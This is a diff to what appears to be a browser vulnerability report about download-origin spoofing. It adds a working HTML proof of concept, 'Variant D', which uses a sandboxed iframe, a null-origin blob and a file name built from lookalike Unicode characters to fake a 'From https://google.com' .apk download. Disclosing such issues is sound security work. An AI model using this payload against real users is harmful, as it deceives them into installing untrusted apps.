@@ -56,7 +56,20 @@ target is `data:`.
 | `https://…` | `1 bytes — killukeren.github.io — 22:44` |
 | `blob:https://…` | `1 bytes — killukeren.github.io — 22:44` |
 | `data:` | `1 bytes — (data) — 22:44` |
-| `blob:null/…` (from a `data:` page) | `1 bytes — (data) — 22:44` |
+| `blob:null/…` (from a sandboxed iframe) | `1 bytes — (data) — 22:44` |
+
+Variant D — same result with a blob, as long as the blob URL has a null origin:
+
+```html
+<iframe sandbox="allow-scripts allow-downloads" srcdoc="&lt;script&gt;
+  const u = URL.createObjectURL(new Blob(['x'], {type:'application/octet-stream'}));
+  const a = document.createElement('a');
+  a.href = u; a.download = 'ini aplikasi apa From https\u2236\u2215\u2215google.com.apk';
+  a.click();
+&lt;/script&gt;"></iframe>
+```
+
+A forged blob URL (`blob:https://google.com/…`) does not resolve, so the download fails.
 
 Firefox 160 is not affected by this variant: its download item uses `crop="center"`, so the
 extension stays visible.
